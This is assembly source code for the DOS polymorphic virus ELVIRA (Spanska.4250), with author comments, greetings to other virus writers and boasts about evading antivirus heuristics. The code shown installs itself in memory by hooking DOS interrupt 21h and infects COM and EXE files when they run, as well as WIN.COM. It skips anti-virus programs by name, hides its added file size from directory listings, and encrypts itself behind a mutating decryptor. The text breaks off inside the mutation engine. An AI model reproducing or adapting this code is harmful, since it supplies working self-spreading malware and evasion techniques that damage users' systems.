   ;                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                   ³      ELVIRA virus by Spanska     ³
   ;                   ³ Called Spanska.4250 by AV people ³
   ;                   ³      This is my fourth virus     ³
   ;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; *********************************************************************
   ;      This virus is dedicated to a girl with black hairs and
   ;      green eyes, a so lovely vampyre haunting Paris nights.
   ;
   ;      - Greets to my friend VicodinES, Roadkill and all 29A guys
   ;      (next time, don't fuck the cyberbar computers with your
   ;      viruses! The day after, i couldn't send a mail to my girl.
   ;      And for the next meeting, i will try to get up for the
   ;      night rendez-vous in the Gran Via McDonald :)
   ;      - French virus coders, where are you? I feel alone...
   ; ******************************contact me at el_gato@rocketmail.com***
   ;
   ;
   ; At the time it was released (September 97), the heuristic
   ; detection on 100 infected bait files was:
   ;       - TBSCAN 7.07           0/100
   ;       - TBSCANW 7.06          5/100
   ;       - FPROT 2.26            2/100
   ;       - AVP 3.0 (1.08)        0/100
   ;       - FINDVIRUS 7.69        0/100
   ;       - DRWEB                20/100
   ;
   ; generation zero size: 4297 bytes
   ; virus size:           4250 bytes
   ;
   ; compile it with TASM /m2 and TLINK /t
   ;
   ;       Properties:
   ; TSR/runtime COM/EXE semi-stealth polymorphic
   ; Signature: "k" and seconds = 30
   ; No infection of some AV or command.com
   ; Disables stealth routine in case of archiver execution
   ; Immediately infects win.com (so it can infect all DOS programs
   ;    under W3.1 or W95).
   ; Graphical payload with 3 messages in french, english and spanish
   ;    (Star-Wars like effect, see extracted routine in elvira-g.com)
   ; Slow poly (just 365 possibilities because i'm an idiot)
   ;
   ; About the poly routine:
   ; As you can see, the poly engine is a very simple routine. Each
   ; instruction on the decryptor is set to a fixed size block (what
   ; i call "mutation" in the source. There are 14 different blocks.
   ; For each of these blocks, i have a stock of something like 10
   ; similar ones that perform the same operation, but with different
   ; manner (see end of virus; for exemple, i have 12 ways to get
   ; the delta offset in 23 bytes). This lame engine has some
   ; advantages. 1/ It's very easy and quick to code. 2/ You can add
   ; very easily new blocks in the stock, for example to make new
   ; undetectable strains. 3/ You can have a great strain variability,
   ; just limited by your imagination (think all the possible manners
   ; to replace a "mov ax, bx" or a "call XX"). Of course, there are
   ; some problems. 1/ Mutation start always at same offset. 2/ You
   ; sometimes have to "fill the holes" in blocks (with nops for
   ; example). 3/ Mutation stocks are big (in this virus, 2000-2500
   ; bytes).

   code    segment
       assume  ds:code, ss:code, cs:code, es:code
       org 100h

   start:
   db 0E9h, 2Ch, 00                ;jmp start_virus
   signature db "k"                ;signature

   ;******************FAKE HOST***************************
   mov dx, offset message                               ;*
   mov ah, 09h                                          ;*
   int 21h                                              ;*
   mov     ax,4c00h                                     ;*
   int     21h                                          ;*
   message db "------Fake host execution-----$"         ;*
   ;******************************************************

   start_virus:

   mutation0:
       db 0B8h, 38h, 1         ;mov ax, offset delta
       db 0B9h, 0Eh, 0         ;mov cx, offset mutation1-delta
       call $+3
       ;delta:
       mov bx, sp
       mov dx, ss:[bx]
       sub dx, ax
       mov bp, dx
       add ss:[bx], cx
       ret
       clc

   mutation1:
       push es
       push ds
       push cs
       push cs
       pop es
       pop ds
       db 14 dup (90h)

   mutation2:
       db 0EBh, 0Eh                    ;jmp decrypte
       nop
       nop
       nop

   mutation3:
       baise_flag_cryptage:
       stosb
       nop
       nop
       nop
       nop
       nop

   mutation4:
       ret
       nop
       nop
       nop
       nop
   ;
   ;----------------------decrypting routine-------------------------
   ;
   decrypte:

   mutation5:
       mov cx, fin_cryptage-debut_cryptage
       nop
       nop
       nop

   mutation6:
       lea si, [bp+offset debut_cryptage]
       nop
       nop
       nop
       nop
       nop
       nop

   mutation7:
       mov di, si
       nop
       nop

   mutation8:
       mov dl, cs:[bp+offset clef]
       nop
       nop
       nop
       nop
       nop

   mutation9:
       xor_loop:
       lodsb
       nop
       nop
       nop
       nop
       nop

   mutation10:
       xor al, dl
       nop
       nop
       nop
       nop
       nop
       nop
       nop
       nop

   mutation11:
       call baise_flag_cryptage
       db 90h, 90h, 90h, 90h, 90h
       db 90h, 90h, 90h, 90h

   mutation12:
       dec cx
       nop
       nop
       nop
       nop

   mutation13:
       cmp cx, 0
       nop
       nop
       nop

   mutation14:
       jne xor_loop
       db 90h, 90h, 90h
       db 90h, 90h


   debut_cryptage:                 ;end of polymorphic decryptor

   ;***************** save original es, ds *******************

   pop ds
   pop es
   push es
   push ds

   ;************* test if virus is already resident ******************

   mov ax, 6969h
   int 21h                         ;is my handler here?
   cmp bx, 6969h                   ;if yes, bx = 6969h
   jne va_resident                 ;no => go resident
   jmp deja_installe               ;yes => stop

   ;********************* go TSR ***************************

   va_resident:

   push 4a00h
   pop ax
   mov bx,0ffffh                                   ;is there some free memory?
   int 21h                                         ;return bx = memory - max size

   sub bx,((endvirus-start_virus+0fh)/10h)*2+1     ;substract what we need
                           ;now bx=wanted paragraphs
   push 4a00h
   pop ax
   int 21h                                         ;return es = free block segment

   push 4800h                                      ;set memory
   pop ax
   mov bx,((endvirus-start_virus+0fh)/10h)*2
   int 21h                                         ;return ax = free segment

   dec ax
   mov es,ax                                       ;es points on the
   inc ax                                          ;new MCB

   mov byte ptr es:[0],'Z'                         ;mark it as the last one
   mov cx, 8                                       ;owner = dos
   mov word ptr es:[1],cx

   mov cx, cs                                      ;copy virus in memory
   mov ds, cx
   lea si, [bp+offset start_virus]
   mov es, ax
   xor di, di
   mov cx, endvirus-start_virus
   rep movsb
   push ax

   ;********** install my interruption 21 ************************

   installe:

   ;------ 1) get the old interruption vector

   push 3521h
   pop ax
   int 21h                                         ;return bx=offset, es=segment
   pop ds
   mov ds:[offset ip_21-offset start_virus], bx    ;save offset
   mov ds:[offset cs_21-offset start_virus], es    ;save segment

   ;------ 2) put my own vector

   mov dx, [offset nouvelle_int_21-offset start_virus]
   push 2522h
   pop ax
   dec ax                               ;avoid flag M
   int 21h

   ;------ 3) Am i WIN.COM?

   mov word ptr ax, cs:[104h]      ;bytes 4 and 5 of WIN.COM de W95
   cmp ax, 0E1Fh
   jne i_am_not_win
   mov word ptr ax, cs:[106h]      ;bytes 6 and 7 of WIN.COM de W95
   cmp ax, 0E807h
   je i_am_win

   i_am_not_win:
   call infecte_win                ;infect win.com

   i_am_win:
   jmp deja_installe

   ;******************** my interruption 21 *****************************

   nouvelle_int_21:

   cmp byte ptr cs:[stealth_non-start_virus], 0FFh         ;archiver: no stealth
   je saute_dir_stealth

       xor ah, 55h
   cmp ah, 44h                     ;dir?
   je dir_stealth
   cmp ah, 47h                     ;dir?
   je dir_stealth
       xor ah, 55h
   saute_dir_stealth:

   xor ax, 5555h                   ;avoid flag L
   cmp ax, 1E55h                   ;program execution?
   jne suite                       ;no => continue
   xor ax, 5555h
   jmp infecte                     ;yes => infect program
   suite:
   xor ax, 5555h
   cmp ax, 6969h                   ;residency test?
   jne vieille_int_21              ;no => let's continue with old int
   xchg ax, bx                     ;yes => put 6969h in bx
   iret                            ;and return to program

   ;***************** old interruption 21 *************************

   vieille_int_21:
   db 0EAh                         ;EAh=JMP FAR
   ip_21 dw ?                      ;offset old int
   cs_21 dw ?                      ;segment old int
   iret

   ;****************** directory stealth ********************************

   dir_stealth:
   xor ah, 55h
   pushf                   ;simulation of an int 21h, so push flags
   push cs                 ;and segment
   call vieille_int_21     ;call old int 21h
   or al, al               ;if al=0 all is OK
   jnz exit_fcb            ;if al<>0 stop stealth

   push ax
   push bx
   push es
   push 5100h              ;get current psp
   pop ax
   int 21h                 ;return segment psp in bx, offset in dx
   mov es, bx              ;now es = segment psp
   cmp bx, es:[16h]        ;come from DOS?
   jnz exit_fcb2           ;no => stop stealth
   mov bx, dx              ;bx= psp offset
   mov al, [bx]            ;extended fcb?
   push ax                 ;save marker of extended fcb
   push 2F00h              ;get current dta
   pop ax
   int 21h                 ;return in es:bx dta position
   pop ax                  ;get back fcb marker
   inc al                  ;FFh+1=0, so if extended z=0
   jnz no_fix              ;no extended
   add bx, 7               ;extended: offset is 7 bytes more
   no_fix:
   mov al, es:[bx+17h]     ;time in al
   and al, 00011111b       ;just look at seconds
   xor al, 00001111b       ;seconds = 30?
   jne exit_fcb2           ;no => stop stealth
   cmp word ptr es:[bx+1fh], 0                             ;prog<65000?
   jne soustraction                                        ;no => stealth it
   cmp word ptr es:[bx+1dh], 500+endvirus-start_virus      ;prog<virus size+500?
   jb exit_fcb2                                            ;yes => no stealth
   soustraction:
   sub word ptr es:[bx+1dh], endvirus-start_virus          ;substract virus size
   sbb word ptr es:[bx+1fh], 0
   exit_fcb2:
   pop es
   pop bx
   pop ax
   exit_fcb:
   iret

   ;********************* INFECTION ***************************************

   infecte:
   pushf
   push ax
   push bx
   push cx
   push dx
   push si
   push di
   push es
   push ds

   ;---- 1) do not infect an anti-virus

   mov si, dx                              ;ds:dx = offset program name
   mov di, offset av_liste-start_virus     ;in di, offset AV list

   cherche_extension:                      ;find extension
   lodsb
   cmp al, "."
   jnz cherche_extension

   lodsw
   mov cs:[f_ext-start_virus], ax          ;put extension in memory
   lodsb
   mov cs:[f_ext-start_virus+2], al

   cherche_debut:                          ;find start of program name
   dec si
   dec si
   lodsb
   cmp al, "\"
   jne cherche_debut

   mov cs:[f_name-start_virus], ds         ;put segment/offset of program name
   mov cs:[f_name-start_virus+2], si       ;in memory

   push cs                         ;scasw uses es:di
   pop es                          ;so exchange segments

   lodsw                           ;get 2 first letters
   mov cx, 13                      ;12 AV names to compare + COMMAND.COM
   repne scasw                     ;compare
   jne  av_ok
   jmp redonne_la_main             ;it's an AV => do not infect
   av_ok:

   mov byte ptr cs:[stealth_non-start_virus], 0            ;switch to zero
   mov cx, 5                                               ;5 archivers
   repne scasw                                             ;test names
   jne zip_ok
   mov byte ptr cs:[stealth_non-start_virus], 0FFh         ;it's an archiver
   zip_ok:

   ;----- 2) open file and read header

   mov ds, cs:[f_name-start_virus]                 ;file name in
   mov dx, cs:[f_name-start_virus+2]               ;ds:dx for attribs

   push 4300h                                      ;get attribs in al
   pop ax
   int 21h
   mov byte ptr cs:[f_attrib-start_virus], al      ;attribs in memory

   xor cx, cx
   push 4301h                                      ;attribs to zero
   pop ax
   int 21h

   mov ax, 03d02h                                  ;open file in read/write
   int 21h
   jnc cont
   jmp redonne_la_main_attributs                   ;problem? do not infect

   cont:
   xchg ax, bx                                     ;handle in bx
   mov word ptr cs:[f_handle-start_virus], bx

   push cs                                         ;all segments point
   push cs                                         ;to virus code
   pop es
   pop ds

   push 5700h                                      ;get time/date
   pop ax
   int 21h
   mov cs:[f_time-start_virus], cx                 ;in memory
   mov cs:[f_date-start_virus], dx

   mov ax, 3F00h                                   ;read file
   mov cx, 1ch                                     ;1Ch first bytes
   mov dx, offset exehead-start_virus              ;in their buffer
   int 21h

   ;---- 3) is it an exe or a com?

   cmp ds:[f_ext-start_virus], "XE"
   jne compare_suite
   cmp byte ptr ds:[f_ext-start_virus+2], "E"
   jne compare_suite
   jmp infecte_exe

   compare_suite:
   cmp ds:[f_ext-start_virus], "OC"
   jne pas_bonne_ext
   cmp byte ptr ds:[f_ext-start_virus+2], "M"
   je infecte_com

   pas_bonne_ext:
   jmp ferme_et_redonne_la_main_sans_infection

   ;---- 4) COM infection

   infecte_com:
   cmp byte ptr ds:[exehead-start_virus+3], "k"    ;already infected?
   jz pas_bonne_ext                                ;yes => do not infect

   mov si, offset exehead-offset start_virus       ;transfert 4 bytes
   mov di, offset contenu-offset start_virus       ;from buffer to new location
   movsw
   movsw

   mov ax, 4202h                                   ;pointer at the end of file
   push ax                                         ;return size in ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   cmp ax, 56000                                   ;no infection if
   jb verif_trop_petit
   jmp ferme_et_redonne_la_main_sans_infection     ;.com is > 56000
   verif_trop_petit:
   cmp ax, 500
   ja ecriture_com
   jmp ferme_et_redonne_la_main_sans_infection     ;or < 500

   ecriture_com:
   sub ax, 3                                       ;size-3 (cause JMP at start)
   push ax                                         ;save corrected size

   CALL POLY_DEPUIS_RESIDENT

   push 4000h                                      ;write decryptor
   pop ax
   xor dx, dx
   mov cx, debut_cryptage-start_virus
   int 21h

   push 4000h                                      ;write encrypted body
   pop ax
   mov dx, offset heap-start_virus
   mov cx, endvirus-debut_cryptage
   int 21h

   mov di, offset exehead-offset start_virus       ;adjust buffer
   mov al, 0E9h                                    ;with a jump
   stosb
   pop ax
   stosw                                           ;then corrected size
   mov al, "k"
   stosb                                           ;then signature

   mov ax, 4200h                                   ;pointer at file start
   push ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   push 4000h                                      ;overwrite 4 first bytes
   pop ax                                          ;with JMP+signature
   mov cx, 4
   mov dx, offset exehead-start_virus
   int 21h

   jmp ferme_et_redonne_la_main

   ;----- 5) EXE infection

   infecte_exe:
   cmp byte ptr ds:[exehead-start_virus+18h], 40h  ;windows file?
   je exe_pas_bon                                  ;yes => stop
   cmp byte ptr ds:[exehead-start_virus+12h], "k"  ;already infected?
   je exe_pas_bon                                  ;yes => stop
   mov ax, word ptr ds:[exehead-start_virus]       ;good MZ header?
   add ah, al                                      ;add M+Z
   cmp ah,0A7h                                     ;avoid flag Z
   je exe_bon

   exe_pas_bon:
   jmp ferme_et_redonne_la_main_sans_infection
   exe_bon:

   ;save header values

   mov di, offset vIP-offset start_virus
   mov ax, word ptr cs:[exehead-start_virus+14h]
   stosw
   mov ax, word ptr cs:[exehead-start_virus+16h]
   stosw
   mov ax, word ptr cs:[exehead-start_virus+0Eh]
   stosw
   mov ax, word ptr cs:[exehead-start_virus+10h]
   stosw

   mov ax, 4202h                                   ;pointer at file end
   push ax                                         ;return size in dx:ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h
   push ax                                         ;save size
   push dx

   ; calculate new CS:IP

   push ax
   mov ax, word ptr cs:[exehead-start_virus+08h]
   mov cl, 4
   shl ax, cl
   mov cx, ax
   pop ax
   sub ax, cx
   sbb dx, 0

   mov cl, 0Ch
   shl dx, cl
   mov cl, 4
   push ax
   shr ax, cl
   add dx, ax
   shl ax, cl
   pop cx
   sub cx, ax

   mov  word ptr cs:[exehead-start_virus+14h], cx          ;new CS:IP values
   mov  word ptr cs:[exehead-start_virus+16h], dx
   inc dx                                                  ;avoid flag K
   mov  word ptr cs:[exehead-start_virus+0Eh], dx          ;new SS:SP values
   mov  word ptr cs:[exehead-start_virus+10h], 0FFFEh

   ; calculate new size

   pop dx
   pop ax
   push ax
   add ax, endvirus-start_virus
   adc dx, 0
   mov cl, 7
   shl dx, cl
   mov cl, 9
   shr ax, cl
   add ax, dx
   inc ax
   mov word ptr cs:[exehead-start_virus+04h], ax
   pop ax
   add ax, endvirus-start_virus
   and ah, 1
   mov word ptr cs:[exehead-start_virus+02h], ax

   mov word ptr cs:[exehead-start_virus+12h], "k"  ;write signature

   mov ax, 4202h                                   ;pointer at file end
   push ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   CALL POLY_DEPUIS_RESIDENT

   push 4000h                                      ;write decryptor
   pop ax
   xor dx, dx
   mov cx, debut_cryptage-start_virus
   int 21h

   push 4000h                                      ;write encrypted body
   pop ax
   mov dx, offset heap-start_virus
   mov cx, endvirus-debut_cryptage
   int 21h

   mov ax, 4200h                                   ;pointer at file start
   push ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   push 4000h                                      ;overwrite exe header
   pop ax
   mov cx, 1ch
   mov dx, offset exehead-start_virus
   int 21h

   jmp ferme_et_redonne_la_main

   ;----- 6) close and return to program

   ferme_et_redonne_la_main_sans_infection:

   mov cx, cs:[f_time-start_virus]                 ;get time/date from memory
   mov dx, cs:[f_date-start_virus]
   jmp time_date

   ferme_et_redonne_la_main:

   mov cx, cs:[f_time-start_virus]                 ;get time/date from memory
   mov dx, cs:[f_date-start_virus]

   and cl, 11100000b                               ;change seconds to 30
   xor cl, 00001111b                               ;as an infection marker

   time_date:
   push 5701h                                      ;change time/date
   pop ax                                          ;avoid flag F
   int 21h

   mov ax, 3e00h                                   ;close file
   int 21h

   redonne_la_main_attributs:

   mov ds, cs:[f_name-start_virus]                 ;file name in
   mov dx, cs:[f_name-start_virus+2]               ;ds:dx for attribs

   xor ch, ch
   mov byte ptr cl, cs:[f_attrib-start_virus]      ;set back attribs
   push 4301h
   pop ax
   int 21h

   redonne_la_main:

   pop ds
   pop es
   pop di
   pop si
   pop dx
   pop cx
   pop bx
   pop ax
   popf

   jmp vieille_int_21      ;after infection, continue with normal int

   ;****** if program is already resident, or after going TSR *********

   deja_installe:
   pop ds                  ;get original segments
   pop es

   ;******************* bomb or not bomb? **********************************

   bombe_ou_pas:
   mov ah, 2Ch             ;internal clock: return ch=hour and cl=minute
   int 21h
   cmp cl, 30d             ;are we at 30'?
   jne com_ou_exe          ;no => terminate
   cmp dh, 15d             ;yes => test seconds
   ja com_ou_exe           ;if seconds > 15 we finish
   jmp bombe               ;if seconds < 15 the bomb explodes! (1/240)

   ;************* terminate a com or an exe? ****************

   com_ou_exe:
   cmp byte ptr cs:0, 0CDh         ;a COM always have an INT 20h at offset 0
   je redonne_main_com

   ;------ 1) terminate an exe

   mov ax, es
   add ax, 10h
   add word ptr cs:[bp+vCS], ax
   cli
   add ax, word ptr cs:[bp+vSS]
   mov ss, ax
   mov sp, word ptr cs:[bp+vSP]
   sti

   call annuler_registres

   db 0EAh                 ;far jump to the original exe code
   contenu:
   vIP dw 9090h            ;buffer to stock original file info
   vCS dw 9090h            ;EXE: stock ip, cs, ss, sp
   vSS dw 9090h            ;COM: stock les 5 premiers octets
   vSP dw 9090h

   ;----- 2) terminate a com

   redonne_main_com:
   mov cx, word ptr [bp+offset contenu]    ;transfer 4 first bytes
   mov cs:[100h], cx                       ;to file start in memory
   mov cx, word ptr [bp+offset contenu+2]  ;avoid flag O
   mov cs:[102h], cx

   mov di, 101h                            ;put 100h into stack for the RET
   dec di                                  ;avoid flag B
   push di

   call annuler_registres

   ret

   ;----- all registers to zero

   annuler_registres:
   xor ax, ax
   xor bx, bx
   xor cx, cx
   xor dx, dx
   xor di, di
   xor si, si
   xor bp, bp
   ret

   ;**********************************************************************
   ;*************** infect win.com in runtime mode ***********************
   ;**********************************************************************

   infecte_win:
   push ds
   push es

   push cs
   push cs
   pop ds
   pop es

   mov cx, 0007h                           ;all attribs
   lea dx, cs:[bp+offset file_win]         ;ds:dx= file name (win.com)
   mov ax, 4e00h                           ;find file
   int 21h
   jnc suite_win
   jmp fin_win

   suite_win:
   push 4300h
   pop ax
   int 21h
   mov byte ptr cs:[bp+f_attrib], al       ;attribs in memory

   xor cx, cx
   push 4301h                              ;attribs to zero
   pop ax
   int 21h

   mov ax, 3D02h                           ;open file
   lea dx, cs:[bp+offset file_win]         ;to file name
   int 21h
   jc remise_en_etat2

   xchg ax, bx                             ;handle in bx
   mov word ptr cs:[bp+f_handle], bx       ;and in memory

   push 5700h                              ;get time/date
   pop ax
   int 21h
   mov word ptr cs:[bp+f_time], cx         ;in memory
   mov word ptr cs:[bp+f_date], dx

   mov cx, 4                               ;4 bytes to read
   mov ax, 3F00h                           ;read file
   lea dx, cs:[bp+offset exehead]          ;buffer
   int 21h
   jc remise_en_etat

   cmp byte ptr cs:[bp+offset exehead+3], "k"      ;already infected?
   jne continue_inf_win                            ;no => continue

   remise_en_etat:
   mov ah, 3Eh                             ;close file
   int 21h

   remise_en_etat2:
   mov cl, byte ptr cs:[bp+offset f_attrib]        ;attribs in cl
   lea dx, [bp+offset file_win]
   push 4301h                                      ;change attribs
   pop ax                                          ;avoid flag F
   int 21h
   jmp fin_win

   continue_inf_win:
   lea si, cs:[bp+offset contenu]          ;4 first bytes
   lea di, cs:[bp+offset win4octets]       ;in a temp buffer
   movsw
   movsw

   lea si, cs:[bp+offset exehead]
   lea di, cs:[bp+offset contenu]
   movsw
   movsw

   ;---------pointer to end of disk file (return size in dx:ax)---------

   mov ax, 4202h
   push ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   sub ax, 3                       ;size-3 (cause JMP at start)
   push ax                         ;remember size

   CALL POLY_DEPUIS_RUNTIME        ;poly, but from runtime routine

   push 4000h                      ;write decryptor
   pop ax
   lea dx, cs:[bp+offset start_virus]
   mov cx, debut_cryptage-start_virus
   int 21h

   push 4000h                      ;write encrypted body
   pop ax
   lea dx, cs:[bp+offset heap]
   mov cx, endvirus-debut_cryptage
   int 21h

   lea di, [bp+offset exehead]     ;adjust buffer
   mov al, 0E9h                    ;with a jump
   stosb
   pop ax
   stosw                           ;and with size-3
   mov al, "k"
   stosb                           ;and then signature

   mov ax, 4200h                   ;pointer at file start
   push ax
   pop ax
   xor cx, cx
   xor dx, dx
   int 21h

   push 4000h                      ;overwrite 4 first bytes
   pop ax
   mov cx, 4
   lea dx, [bp+offset exehead]
   int 21h

   mov cx, cs:[bp+f_time]          ;get time/date
   mov dx, cs:[bp+f_date]

   and cl, 11100000b               ;seconds to 30
   xor cl, 00001111b               ;as infection marker

   push 5701h                      ;change time/date
   pop ax                          ;avoid flag F
   int 21h

   mov ah, 3Eh                     ;close file
   int 21h

   mov cl, byte ptr cs:[bp+offset f_attrib]        ;attribs in cl
   lea dx, cs:[bp+offset file_win]
   push 4301h                                      ;change attribs
   pop ax                                          ;avoid flag F
   int 21h

   lea si, cs:[bp+offset win4octets]               ;get back 4 win.com
   lea di, cs:[bp+offset contenu]                  ;first bytes
   movsw
   movsw

   fin_win:
   pop es
   pop ds

   ret

   ;*******************************************************
   ;******************** BOMB *****************************
   ;*******************************************************

   bombe:
   largeur equ 255
   profondeur equ 40

   ;-----------all segments equal to cs-------------

   push cs
   push cs
   pop ds
   pop es

   terrain:
   ;--------------------go to VGA mode 13h-------------------------------

   mov ax, 13h
   int 10h

   ;------------------set color 1 to black----------------------------

   mov dx, 3c8h
   xor al, al
   out dx, al
   inc dx
   mov cx, 6
   tout_noir:
   out dx, al
   loop tout_noir

   ;--------------write black message on screen-------------------------

   ; 1/ select one of the 3 messages randomly

   xor dx, dx
   lea si, [bp+msg_bombe+23]
   push si
   pop di
   mov ax, 3
   mov bx, 23*3
   call mute_bloc

   lea si, [bp+offset msg_bombe]
   mov cx, 5
   affiche_message:
   cmp cx, 4               ;second line is empty
   je pas_ligne_3

   ; 2/ put cursor to good coordinates

   xor bh, bh
   mov ah,02h
   int 10h

   ; 3/ write one line

   push cx
   mov cx, 23
   affiche_ligne:
       lodsb
       mov bl, 1
       mov ah, 0Eh
       int 10h
   loop affiche_ligne
   pop cx

   pas_ligne_3:
   add dh, 1
   loop affiche_message

   ;--------------initialize segments-----------------------

   mov ax, 0A000h
   mov ds, ax

   mov ax, cs
   add ah, 32              ;data will be on a stock segment far
   mov es, ax              ;away from actual code
   push es                 ;on stack (cf [@@] + bas)

   ;-------------creation of the table (x,z) NB: y constant--------------
   ;here ds=video  es=stock

   mov cx, (largeur*profondeur)    ;255*40 coordinates
   xor si, si                      ;start of video screen
   xor di, di                      ;start of stock zone
   xor dx, dx                      ;end line counter

   table:
   mov bl, cl              ;X: 0<bl<255
   mov al, 128             ;center it
   sub al, bl              ;-128<al<128
   stosb                   ;stock X

   inc dx                  ;now, COLOR
   or dl, dl               ;end of line?
   jnz pas_fin_de_ligne    ;yes if dl=0
   add si, 319-largeur     ;so => next video line
   pas_fin_de_ligne:       ;not end of line
   movsb                   ;stock COLOR

   mov ax, cx              ;Z: 0<ax<40*255
   xor al, al              ;0<ah<40
   xchg ah, al             ;0<al<40
   shl al, 1               ;0<al<80
   shl al, 1               ;0<al<160
   inc ax                  ;1<ax<161 to avoid div by 0
   stosw                   ;stock Z

   loop table

   ;-------------------animation of letters-----------------------------
   ;here ds=video, es=stock

   push ds
   pop es                         ;es=video now
   pop ds                         ;ds to stock segment (cf [@@])
   anime:

   ;***********************
       mov     dx,3dah   ;*
   VRT:                  ;*
       in      al,dx     ;*
       test    al,8      ;*
       jnz     VRT       ;*   wait vertical retrace
                 ;*   to avoid flicking
   NoVRT:                ;*
       in      al,dx     ;*
       test    al,8      ;*
       jz      NoVRT     ;*
   ;***********************

   mov cx, largeur*profondeur              ;we will draw 255*40 points
   xor si, si                              ;ds:si=coordinates stock
   xor di, di                              ;es:di=video
   dessine:
   lodsw                                   ;X and color in ax
   xchg ax, bx                             ;now in bx
   lodsw                                   ;Z in ax
   mov word ptr cs:[bp+offset z], ax       ;Z into a temp buffer
   cmp ax, (128+4*profondeur)              ;point is too far?
   jb ca_sort_pas                          ;no => OK
   sub ax, 200                             ;yes => put it at the front
   ca_sort_pas:
   inc ax                                  ;increment distance
   mov word ptr ds:[si-2], ax              ;stock new Z

   ;----------calculate xx et yy (screen) from x, y, z (3D)-------------
   ;optimization using bl as X and color as bh

   push cx                          ;save counter
   xchg ah, bl                      ;get X in ah
   xor bl, bl                       ;bl used to remember sign
   cmp ah, 128                      ;X positive?
   jb suite5                        ;yes => OK
   neg ah                           ;no => let's positivize it
   inc bl                           ;and we remember it was negative
   suite5:                          ;NB: calculations in fixed point mode
   xor al, al                       ;X is in ah, same order than Z
   xor dx, dx                       ;dx will not fuck my div
   div word ptr cs:[bp+offset z]    ;div X by Z
   push ax                          ;result is coordinate 2D (XX)
   mov ah, 60                       ;Y is backside, altitude 60 = ground
   xor al, al                       ;Y is in ah, same order than Z
   xor dx, dx                       ;i said dx will not fuck my div
   div word ptr cs:[bp+offset z]    ;div Y by Z
   xchg cx, ax                      ;result is coordinate 2D (YY)

   ;-------calculate video offset of points from XX and YY--------------
   ;optimization using cx as YY and XX on stack
   ;color is in bh, sign in bl

   pop dx                           ;get XX from stack
   cmp cx, 170                      ;too much at the bottom: no plot
   ja pas_plot
   cmp dx, 156                      ;too much on sides: no plot
   ja pas_plot

   push dx                          ;XX loves the stack
   mov ax, 320                      ;screen width
   mul cx                           ;multiply YY by width
   pop dx                           ;XX from stack to dx
   cmp bl, 1                        ;X and XX negative?
   jne pos
   sub ax, dx                       ;yes => substract XX from ax
   jmp suite4
   pos:
   add ax, dx                       ;non => add XX to ax

   suite4:
   add ax, (320*30)+160             ;add screen height

   ;--------calculate color of point (shade effect)------------------

   mov di, ax                       ;ax is video offset of point
   push ax                          ;on stack
   or bh, bh                        ;black point?
   je eteindre                      ;yes => bypass shading routine

   mov word ptr bx, cs:[bp+offset z]  ;128<bx<328
   mov cl, 4                          ;divide it by 16
   shr bx, cl                         ;8<bx<20
   mov al, 36                         ;default B&W colors (31=white,16=black)
   sub al, bl                         ;16<al<28
   jmp pas_eteindre
   eteindre:
   xor al, al                         ;color black
   pas_eteindre:

   ;--------calculate point size------------------

   pop dx                  ;get point offset

   cmp dx, 320*100         ;above line 100?
   jb fond                 ;yes => little point (far)

   cmp dx, 320*151         ;above line 153?
   jb moyen                ;yes => middle point

   proche:                 ;other case => big point (near)
   stosb
   stosb
   stosb
   add di, 320-3           ;big = 2 lines of 3 pixels
   stosb
   stosb
   stosb
   jmp pas_plot

   moyen:
   stosb                   ;middle = 2 pixels
   fond:
   stosb                   ;little = 1 pixel

   pas_plot:

   pop cx                    ;get back counter
   dec cx                    ;one more point
   je suite9                 ;end of screen?
   jmp dessine               ;no => next point
   suite9:

   jmp anime                ;yes => next screen

   ;-----------memory zones used for graphic effect------------

   msg_bombe       db "       ELVIRA !        "
           db " Black and White Girl  "
           db "     from Paris        "
           db "You make me feel alive."

           db "Pars. Reviens. Respire."
           db "     Puis repars.      "
           db " J'aime ton mouvement. "

           db " Bruja con ojos verdes "
           db " Eres un grito de vida,"
           db " un canto de libertad. "

   z dw ?

   ;************ memory zones used by virus********************

   win4octets      db 90h, 90h, 90h, 90h
   f_ext           db 0EEh, 0EEh, 0EEh
   f_attrib        db 0AAh
   f_name          dd ?
   f_time          dw ?
   f_date          dw ?
   f_handle        dw ?
   exehead db 1Ch dup(0aah)
   av_liste        db "TBVIAVNAVSFIF-FVIVDRSCGUCO"
   zip_liste       db "PKARRALHBA"
   stealth_non     db 0
   file_win        db "C:\WINDOWS\WIN.COM", 0
   copyright       db " (c) Spanska 97"

   ;****************************************************
   ;********** STUPID MUTATION ENGINE ******************
   ;****************************************************

   poly_depuis_runtime:

   push ax
   push bx
   push cx
   push dx
   push es
   push ds
   push bp
   jmp overwrite

   poly_depuis_resident:

   push ax
   push bx
   push cx
   push dx
   push es
   push ds
   push bp

   mov bp, offset start_virus      ;adjust bp value to use from TSR
   neg bp

   ;-----random mutation of decryptor instructions and replacement of code-----

   overwrite:
   lea si, [bp+_mutation0]         ;stock of possible mutations
   lea di, [bp+mutation0]          ;offset of mutation in decryptor
   mov ax, 12                      ;number of possibilities
   mov bx, 23                      ;byte number of this mutation
   call mute_bloc                  ;random select one possibility

   lea si, [bp+_mutation1]
   lea di, [bp+mutation1]
   mov ax, 10
   mov bx, 20
   call mute_bloc

   lea si, [bp+_mutation2]
   lea di, [bp+mutation2]
   mov ax, 10
   mov bx, 5
   call mute_bloc

   lea si, [bp+_mutation3]
   lea di, [bp+mutation3]
   mov ax, 10
   mov bx, 6
   call mute_bloc

   lea si, [bp+_mutation4]
   lea di, [bp+mutation4]
   mov ax, 8
   mov bx, 5
   call mute_bloc

   lea si, [bp+_mutation5]
   lea di, [bp+mutation5]
   mov ax, 9
   mov bx, 6
   call mute_bloc

   lea si, [bp+_mutation6]
   lea di, [bp+mutation6]
   mov ax, 8
   mov bx, 10
   call mute_bloc

   lea si, [bp+_mutation7]
   lea di, [bp+mutation7]
   mov ax, 9
   mov bx, 4
   call mute_bloc

   lea si, [bp+_mutation8]
   lea di, [bp+mutation8]
   mov ax, 7
   mov bx, 10
   call mute_bloc

